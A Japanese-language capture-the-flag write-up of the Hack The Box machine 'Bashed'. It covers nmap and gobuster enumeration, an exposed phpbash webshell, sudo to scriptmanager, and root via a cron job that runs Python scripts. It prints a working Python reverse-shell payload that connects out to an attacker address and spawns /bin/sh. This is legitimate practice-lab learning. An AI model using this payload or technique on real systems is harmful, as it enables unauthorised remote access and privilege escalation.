# はじめに
Hack The Boxの攻略などを自分用にまとめたものです。  
主に記録用として記しています。  
現在のランクはHackerです。  
間違っていることも多いかと思いますが、よろしくお願いします。  
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">    
チートシートも公開しておりますが知識がまだまだ不足しているため、学習経過とともに身につけた内容などを随時更新していきます。  
GitHub(ペネトレーションテスト用チートシート):  
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet  
Twitter:@yukitsukai1731

# Bashed
![スクリーンショット 2020-06-19 0.52.57.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/2d7a8db4-f020-3b75-4920-3e9c6490914b.png)

HackTheBox公式より

Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted.

Bashedは、主にファジングと重要なファイルの位置を特定することに重点を置いた、かなり簡単なマシンです。基本的にはcrontabへのアクセスが制限されているため、Bashedを使うことはできません。


# スキャン
Bashed(10.10.10.68)に対して、スキャンを行います。  
まずnmapからスキャンを開始します。  
## nmap 

```
nmap -sC -sV -Pn -oN bashed.nmap 10.10.10.68
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -oN...通常出力
- -Pn...ping送信をせずにスキャンを行う

```
# Nmap 7.80 scan initiated Thu Jun 18 17:17:51 2020 as: nmap -sC -sV -Pn -oN bashed.nmap 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up (0.23s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 18 17:18:21 2020 -- 1 IP address (1 host up) scanned in 30.18 seconds
```
nmapの結果、80番ポートが空いていることが分かります。  
まずはブラウザからHTTPにアクセスしてみると、phpbashedについて書かれたページが見つかります。   

![スクリーンショット 2020-06-18 17.49.04.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/174d8627-738e-892b-db1c-526dabac52d5.png)

マシンの名前とこのページからphpbashがどこかに設置されているのではないか、と推測します。  
しかしhttp://10.10.10.69/phpbash.phpなどで検索しても見つからないので、ディレクトリスキャナーをかけて他の情報を見つけましょう。  


##Gobuster

```
gobuster dir -t 25 -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,sh,txt,cgi -o bashed.gobuster
```

```
┌─[yukitsukai@parrot]─[~/htb/Bashed]
└──╼ $gobuster dir -t 25 -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,sh,txt,cgi -o bashed.gobuster
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.68
[+] Threads:        25
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,sh,txt,cgi
[+] Timeout:        10s
===============================================================
2020/06/18 23:41:11 Starting gobuster
===============================================================
/images (Status: 301)
/uploads (Status: 301)
/php (Status: 301)
/css (Status: 301)
/dev (Status: 301)
/js (Status: 301)
/config.php (Status: 200)
/fonts (Status: 301)
===============================================================
2020/06/18 00:52:14 Finished
===============================================================
```

この結果を元にブラウザで調べていくと、/devの下にphpbash.phpが見つかることが分かります。
![スクリーンショット 2020-06-18 17.50.36.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/4bd30d45-93c4-82a4-00f5-78920c62c67d.png)


# 侵入
侵入と書いていますが、この時点でWebshellにアクセスできているのでuser.txtは確保できます。  
![スクリーンショット 2020-06-18 17.53.50.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/181d8675-e6b2-dac4-6047-c7fe95296286.png)

# 特権エスカレーション
ここでこのphpbash.phpを使っていていまいち挙動が良くなく不安定だったので、reverse_shell接続を確立しようと思います。
チートシート:
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet

ここでbashやphpを使ってreverse_shellを確立しようとしたのですが、なぜかうまくいきませんでした。  
そこで他に使えるものはないかと、いろいろ調べているとpythonが使えることが分かります。  
![スクリーンショット 2020-06-19 1.40.01.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/4ef1d322-f15b-e0cc-6e6d-9aa7a415e851.png)
python使ってreverse_shellを試みるとうまく成功しました。
![スクリーンショット 2020-06-18 23.53.45.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/fc4a3aad-c025-c6be-cef6-89837ea74dd5.png)

次にsudo -lコマンドを使用すると、現在のユーザ(www-data)がscriptmanagerというユーザでコマンドを実行できることが分かります。  
ls -laでファイルを調べてみるとscriptmanagerの権限でアクセスできるscriptsというディレクトリが見つかりました。  
![スクリーンショット 2020-06-18 23.57.23.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/71ea1264-11f9-88cd-4673-0f5443f8ffd7.png)
scriptsmanagerでbashを起動しましょう。
![スクリーンショット 2020-06-18 23.54.04.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/654d6f1e-8cec-71de-9c39-a827a5081938.png)

scriptsディレクトリの下にはtest.pyとtest.txtと言うものが見つかります。
![スクリーンショット 2020-06-18 23.59.01.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/be7c651a-b986-3eb6-2760-0489a75934a9.png)

test.pyのソース  

```
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

どうやらtest.txtを出力するためのコードのようです。  
またls -laの結果からtest.txtはなぜかroot権限になっています。  
つまり、scriptmanager権限で動かすことができるtest.pyを使うとroot権限で実行できるということになります。  
このことからtest.pyをreverse_shell接続できるように書き換えてみます。  
![スクリーンショット 2020-06-19 0.08.23.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/b4cccade-08e1-d146-6089-e63da7766e53.png)
エディタは使えなかったのでechoコマンドを使って地道に編集していきます。  

```
echo 'import socket,subprocess,os' > test.py
echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)' >> test.py
echo 's.connect(("10.10.14.5",1234))' >> test.py
echo 'os.dup2(s.fileno(),0)' >> test.py
echo 'os.dup2(s.fileno(),1)' >> test.py
echo 'os.dup2(s.fileno(),2)' >> test.py
echo 'p=subprocess.call(["/bin/sh","-i"])' >> test.py
```
netcatで待ち受けておきます。
![スクリーンショット 2020-06-19 1.54.01.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/8c7df0c7-a3f6-7eae-e841-ecac7ee3fd09.png)

test.pyを実行します。

```
python test.py
```

reverse_shell接続はされたのですが、権限がscriptmanagerのままになっています。
![スクリーンショット 2020-06-19 1.23.41.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/04597cac-7456-a8b3-ada5-e6af9917b454.png)

rootを取れなかったので何か別の方法がないか模索していたところ、test.pyは定期的に実行されていることに気が付きました。
crontabコマンドを使ってどんなスケジュールが組まれているのか確かめてみます。

![スクリーンショット 2020-06-19 1.21.39.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/c8f6848b-5263-36bb-9f06-037495930927.png)
これを見ると毎分ごとに.pyとついたファイルが自動実行されていることが分かります。  
このことからtest.pyファイル以外に別のreverse_shell用のファイルを作成してみます。
![スクリーンショット 2020-06-19 2.02.46.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/1e18c546-d894-5339-83d3-a62f42fb91f9.png)
するとreverse.pyは自動実行され待ち受けていたnetcatにreverse_shell接続されます。
![スクリーンショット 2020-06-19 2.04.36.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/6f79369b-b90b-8439-c9f6-6ba4973f7ef6.png)
権限はrootでした。  
お疲れ様でした。